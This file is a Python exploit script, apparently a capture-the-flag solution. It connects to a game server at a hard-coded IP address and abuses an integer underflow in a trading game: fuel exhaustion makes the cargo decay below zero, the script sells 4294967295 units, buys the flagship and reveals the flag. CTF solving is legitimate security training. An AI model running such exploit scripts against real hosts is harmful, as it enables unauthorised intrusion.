import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

sc = socket.create_connection(("146.185.132.36", 31337))
#sc = socket.create_connection(("10.0.0.97", 12345))

sc.send("g = Game.new()\n")

# buying some soylent, which decays on jump
sc.send("g:buy(3, 50)\n")

# use up our fuel
sc.send("g:jump(3)\n")
sc.send("g:jump(2)\n")

# do long jump that we don't have fuel for - soylent will decay 110%, underflowing
sc.send("g:jump(1)\n")

# sell some soylent
sc.send("g:sell(3, 4294967295)\n")
sc.send("g:sell(3, 4294967295)\n")
sc.send("g:sell(3, 4294967295)\n")

# buy flagship
sc.send("g:buyShip(3)\n")

# flagship got flag in inventory, show inventory
sc.send("g:info()\n")

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    